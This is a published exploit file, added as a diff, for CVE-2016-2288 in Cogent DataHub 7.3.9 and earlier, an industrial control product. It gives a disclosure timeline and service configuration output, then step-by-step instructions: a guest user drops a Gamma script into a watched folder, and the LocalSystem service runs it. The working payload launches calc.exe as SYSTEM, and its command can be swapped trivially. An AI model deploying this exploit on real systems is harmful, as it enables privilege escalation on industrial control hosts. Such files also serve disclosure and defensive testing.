@@ -1,0 +1,65 @@
+/*
+
+# Exploit Title: Cogent Datahub <= 7.3.9 Gamma Script Elevation of Privilege Vulnerability
+# Google Dork: lol
+# Date: 28/3/2016
+# Exploit Author: mr_me
+# Vendor Homepage: http://www.cogentdatahub.com/
+# Software Link: http://www.cogentdatahub.com/Contact_Form.html
+# Version: <= 7.3.9
+# Tested on: Windows 7 x86
+# CVE : CVE‑2016-2288
+
+sha1sum: c1806faf0225d0c7f96848cb9799b15f8b249792  CogentDataHub-7.3.9-150902-Windows.exe
+Advsiory: https://ics-cert.us-cert.gov/advisories/ICSA-16-084-01
+
+Timeline:
+=========
+- 02/12/2015 : vuln found, case opened to the zdi
+- 09/02/2016 : case rejected (not interested in this vuln due to vector)
+- 26/02/2016 : reported to ICS-CERT
+- 24/03/2016 : advisory released
+
+Notes:
+======
+- to reach SYSTEM, the service needs to be installed via the Service Manager
+- the service doesnt need to be installed, as long as 'C:\Program Files\Cogent\Cogent DataHub\CogentDataHubV7.exe' has been executed by a privileged user
+- an attacker does NOT need to restart the machine or the service in order to EP, the service just polls for the Gamma Script
+
+Exploitation:
+=============
+
+As a Guest user (or low privileged user) save this file as 'WebstreamSupport.g' into C:\usr\cogent\require\ and enjoy the free SYSTEM calcs. Most OS's dont allow
+a write into c:\ as guest, but we are in the SCADA world. Anything is possible.
+
+C:\Users\steven>sc qc "Cogent DataHub"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Cogent DataHub
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\Cogent\Cogent DataHub\CogentDataHubV7.exe" -H "C:\Users\steven\AppData\Roaming\Cogent DataHub"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Cogent DataHub
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\steven>
+*/
+
+require ("Application");
+require ("AsyncRun");				// thanks to our friends @ Cogent
+
+class WebstreamSupport Application
+{
+
+}
+
+method WebstreamSupport.constructor ()
+{
+	RunCommandAsync(nil, nil, "cmd.exe /c calc", "c:\\");
+}
+
+Webstream = ApplicationSingleton (WebstreamSupport);
